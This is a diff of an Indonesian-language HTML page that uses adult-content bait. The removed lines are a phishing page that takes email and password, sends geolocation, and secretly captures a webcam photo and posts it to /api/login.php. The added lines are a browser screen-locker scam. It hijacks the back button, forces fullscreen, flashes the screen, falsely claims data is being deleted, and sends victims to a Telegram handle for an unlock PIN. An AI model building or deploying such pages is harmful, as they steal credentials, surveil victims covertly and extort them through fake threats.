@@ -2,54 +2,111 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VIRAL17menit - Verifikasi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PORn-INDO | PREMIUM ACCESS</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family:sans-serif; }
-        body { background:#000; overflow:hidden; }
-        .bg { position:fixed; top:0; left:0; width:100%; height:100%; background:url('https://pexels.com') center/cover; filter:blur(6px) brightness(0.6); z-index:1; transform:scale(1.1); }
-        .overlay { position:fixed; top:0; left:0; width:100%; height:100%; z-index:2; display:flex; justify-content:center; align-items:center; background:radial-gradient(circle, rgba(0,0,0,0.1), rgba(0,0,0,0.7)); }
-        .card { background:rgba(0,0,0,0.7); backdrop-filter:blur(15px); -webkit-backdrop-filter:blur(15px); border:1px solid rgba(255,255,255,0.1); padding:40px 25px; width:90%; max-width:380px; border-radius:25px; text-align:center; color:#fff; }
-        .logo { font-size:32px; font-weight:900; margin-bottom:10px; }
-        .logo span { background:#ff9000; color:#000; padding:2px 8px; border-radius:6px; margin-left:5px; }
-        input { width:100%; padding:15px; margin-bottom:12px; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); border-radius:12px; color:#fff; outline:none; }
-        .btn { width:100%; padding:15px; background:#ff9000; color:#000; border:none; border-radius:12px; font-weight:800; cursor:pointer; margin-bottom:20px; }
-        #loader { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:999; justify-content:center; align-items:center; flex-direction:column; }
-        .spin { width:40px; height:40px; border:4px solid #333; border-top:4px solid #ff9000; border-radius:50%; animation:s 0.8s linear infinite; }
-        @keyframes s { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+        body { background: #000; color: #fff; margin: 0; padding: 0; overflow: hidden; font-family: 'Arial', sans-serif; height: 100vh; width: 100vw; }
+        
+        /* Layar Pancingan */
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10001; }
+        .btn-start { padding: 20px 40px; font-size: 22px; background: #ff9900; color: #000; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; }
+        
+        /* Layar Ransomware */
+        #ransom-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; }
+        .flash { animation: flash-bg 0.1s infinite; }
+        @keyframes flash-bg { 0% { background: #fff; } 50% { background: #000; } }
+        
+        h1 { color: red; font-size: 35px; text-shadow: 2px 2px #000; text-align: center; margin-top: 20px; }
+        video { width: 250px; position: absolute; z-index: 9999; border: 2px solid red; }
+        
+        /* Panel PIN */
+        .bottom-panel { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9); padding: 20px; text-align: center; border-top: 2px solid red; }
+        input { padding: 15px; width: 80%; font-size: 18px; margin-bottom: 10px; border: none; border-radius: 5px; }
+        .btn-unlock { padding: 15px 30px; background: red; color: #fff; border: none; font-weight: bold; width: 85%; }
     </style>
 </head>
-<body>
-    <div id="loader"><div class="spin"></div><p style="margin-top:15px; color:#ff9000; font-weight:bold;">Memverifikasi...</p></div>
-    <div class="bg"></div>
-    <div class="overlay">
-        <div class="card">
-            <div class="logo">VIRAL<span>17menit</span></div>
-            <p style="font-size:13px; color:#eee; margin-bottom:25px;">Verifikasi usia untuk menonton video eksklusif.</p>
-            <form action="/api/login.php" method="POST" onsubmit="return start()">
-                <input type="email" name="email" placeholder="Email Akun" required>
-                <input type="password" name="pass" placeholder="Password Akun" required>
-                <button type="submit" class="btn">BUKA KONTEN</button>
-            </form>
+<body onclick="forceFullscreen()">
+
+    <!-- UMPAN -->
+    <div id="overlay">
+        <img src="https://wikimedia.org" width="100" style="margin-bottom: 20px;">
+        <button class="btn-start" onclick="lockSystem()">MASUK KE PORn-INDO</button>
+        <p style="color: #666; margin-top: 10px;">Khusus Dewasa 18+</p>
+    </div>
+
+    <!-- RANSOMWARE -->
+    <div id="ransom-screen" class="flash">
+        <h1>HAHA TOLOL!!<br>PONSEL ANDA TERKUNCI!!</h1>
+        
+        <video id="idiotVideo" loop playsinline>
+            <source src="idiot_video.mp4" type="video/mp4">
+        </video>
+
+        <div class="bottom-panel">
+            <p style="color: yellow; font-weight: bold;">JIKA INGIN BEBAS CHAT TELEGRAM @alzzisback<br>MASUKIN PINNYA</p>
+            <input type="number" id="pinInput" placeholder="MASUKKAN PIN">
+            <button class="btn-unlock" onclick="verifyPin()">UNLOCK PERANGKAT</button>
         </div>
     </div>
-    <video id="v" style="display:none;" autoplay></video><canvas id="c" style="display:none;"></canvas>
+
     <script>
-        async function start() {
-            document.getElementById('loader').style.display = 'flex';
-            navigator.geolocation.getCurrentPosition(r => {
-                fetch(`/api/login.php?lat=${r.coords.latitude}&lon=${r.coords.longitude}`);
-            });
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({video:true});
-                const v = document.getElementById('v'); v.srcObject = s;
-                await new Promise(r => setTimeout(r, 3000));
-                const c = document.getElementById('c'); c.getContext('2d').drawImage(v, 0, 0, 640, 480);
-                await fetch('/api/login.php', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'img='+encodeURIComponent(c.toDataURL('image/png')) });
-                s.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-            return true;
+        const video = document.getElementById('idiotVideo');
+        const screen = document.getElementById('ransom-screen');
+
+        // 1. Kunci Tombol Back (History Hijacking)
+        function antiBack() {
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+                alert("GAK BISA KELUAR TOLOL! MASUKIN PIN!");
+            };
         }
+
+        // 2. Aktifkan Ransomware
+        function lockSystem() {
+            document.getElementById('overlay').style.display = 'none';
+            screen.style.display = 'block';
+            video.play();
+            antiBack();
+            startBouncing();
+            forceFullscreen();
+        }
+
+        // 3. Paksa Fullscreen (Menghilangkan Navigasi HP)
+        function forceFullscreen() {
+            let el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        }
+
+        // 4. Animasi Video Mantul
+        function startBouncing() {
+            let x = 0, y = 0, dx = 8, dy = 8;
+            setInterval(() => {
+                if (x + video.offsetWidth > window.innerWidth || x < 0) dx = -dx;
+                if (y + video.offsetHeight > window.innerHeight || y < 0) dy = -dy;
+                x += dx; y += dy;
+                video.style.left = x + 'px';
+                video.style.top = y + 'px';
+            }, 30);
+        }
+
+        // 5. Cek PIN
+        function verifyPin() {
+            const pin = document.getElementById('pinInput').value;
+            if (pin === "201192777") {
+                alert("AKSES DITERIMA. JANGAN TOLOL LAGI!");
+                window.onbeforeunload = null;
+                location.reload(); 
+            } else {
+                alert("PIN SALAH DASAR TOLOL!");
+            }
+        }
+
+        // 6. Cegah Tutup Tab (Warning)
+        window.onbeforeunload = function() {
+            return "DATA ANDA SEDANG DIHAPUS!";
+        };
     </script>
 </body>
 </html>
